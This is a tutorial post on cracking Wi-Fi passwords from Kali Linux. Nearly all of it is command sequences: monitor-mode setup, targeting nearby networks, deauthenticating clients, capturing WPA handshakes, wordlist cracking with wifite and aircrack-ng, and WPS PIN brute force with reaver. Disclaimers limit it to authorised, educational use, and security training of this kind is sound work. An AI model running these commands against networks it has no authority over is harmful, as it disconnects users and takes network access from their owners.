# Day-20: Wi-Fi Penetration Testing-1 

## THIS IS FOR EDUCATIONAL PURPOSES ONLY. THE PAGE & OWNER ARE NOT RESPONSIBLE FOR ANY DAMAGE CAUSED BY FOLLOWING THE STEPS BELOW.

### Let's Get Started

For the first step, you need a [WiFi Adapter](https://amzn.in/d/08289vCi). This is an affordable option, but if you have a larger budget, you might consider the [Alfa Network Adapter](https://amzn.in/d/06gaCZPK).

### Configuring VirtualBox

1. Connect your adapter to your system.
2. Open VirtualBox > Select your Kali VM > Go to Settings > USB.
3. After selecting USB, add a new USB device by clicking the '+' icon and selecting your adapter.
4. Click 'OK' to save the settings.

### Commands for Wi-Fi Hacking

1. **Check the WiFi adapter in Kali Linux:**
    ```sh
    lsusb
    ```
2. **Check whether the adapter is in 'monitor' mode or 'manage' mode:**
    ```sh
    iwconfig
    ```
3. **Switch the adapter from 'managed' mode to 'monitor' mode:**
    ```sh
    sudo airmon-ng start wlan0
    ```
4. **Search for Wi-Fi networks nearby:**
    ```sh
    sudo airodump-ng wlan0mon
    ```
5. **Choose a target network (ensure the signal strength is above 30 for better results):**

### Preparing for the Attack

We will use a tool called "wifite" to automate the attack process.

#### How Wifite Works

- Sends deauthentication packets to the router, disconnecting all users.
- Captures the target's packets when users attempt to reconnect, generating a .pcap file.
- Uses a common wordlist to brute force the Wi-Fi password from the captured packets.
- Once successful, you will obtain the Wi-Fi password and can connect to the network.

### Executing the Attack

1. **Install Wifite (if not already installed):**
    ```sh
    sudo apt-get update
    sudo apt-get install wifite
    ```
2. **Start Wifite:**
    ```sh
    sudo wifite
    ```
3. **Follow the prompts to select your target network and initiate the attack.**
    - Wifite will display a list of detected networks.
    - Select the network you want to target.
    - Wifite will automatically deauthenticate users, capture the handshake, and attempt to crack the password using a wordlist.

### Additional Tools for Wi-Fi Penetration Testing

#### Aircrack-ng Suite

Aircrack-ng is a complete suite of tools to assess WiFi network security.

1. **Capture packets:**
    ```sh
    sudo airodump-ng wlan0mon
    ```
    - Use this command to capture packets from a specific network:
    ```sh
    sudo airodump-ng --bssid [BSSID] -c [CHANNEL] -w [CAPTURE_FILE] wlan0mon
    ```
2. **Deauthenticate a client:**
    ```sh
    sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon
    ```
3. **Crack the password:**
    ```sh
    sudo aircrack-ng -w /path/to/wordlist.txt -b [BSSID] [CAPTURE_FILE].cap
    ```

#### Reaver

Reaver is a tool for performing brute force attacks against WPS (Wi-Fi Protected Setup) registrar PINs.

1. **Put the interface in monitor mode:**
    ```sh
    sudo airmon-ng start wlan0
    ```
2. **Scan for WPS-enabled networks:**
    ```sh
    sudo wash -i wlan0mon
    ```
3. **Run Reaver against a target:**
    ```sh
    sudo reaver -i wlan0mon -b [BSSID] -vv
    ```

#### Fern WiFi Cracker

Fern WiFi Cracker is a tool for auditing and attacking wireless networks.

1. **Install Fern WiFi Cracker:**
    ```sh
    sudo apt-get update
    sudo apt-get install fern-wifi-cracker
    ```
2. **Run Fern WiFi Cracker:**
    ```sh
    sudo fern-wifi-cracker
    ```
    - Use the GUI to select your wireless adapter, scan for networks, and initiate attacks.

### Important Notes

- Ensure your actions comply with legal and ethical guidelines. Only test networks you have permission to access.
- Wi-Fi penetration testing should be conducted responsibly and solely for educational and security improvement purposes.

Happy Hacking!

---

Disclaimer: This guide is for educational purposes only. Unauthorized access to networks is illegal and unethical.
